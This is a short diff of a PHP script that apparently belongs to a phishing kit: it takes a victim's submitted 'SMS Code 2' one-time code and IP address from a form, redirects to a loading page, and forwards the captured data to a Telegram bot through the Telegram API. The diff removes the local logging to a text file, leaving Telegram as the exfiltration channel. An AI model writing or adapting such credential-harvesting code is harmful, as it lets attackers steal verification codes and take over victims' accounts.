@@ -15,9 +15,7 @@ $sms=$_POST["sms"];
 
 $message="----------SMS----------"."\n"."SMS Code 2 :  ".$sms."\n"."IP: ".$ipp."\n"."----------|SMS|----------";
 $user_ids=$id;
-$filee=fopen("../geni.txt",'a');
-fwrite($filee,$message."\n");
-fclose($filee);
+
 header("location: loading1.php");
 foreach($user_ids as $user_id) {
 $url='https://api.telegram.org/bot'.$token.'/sendMessage';
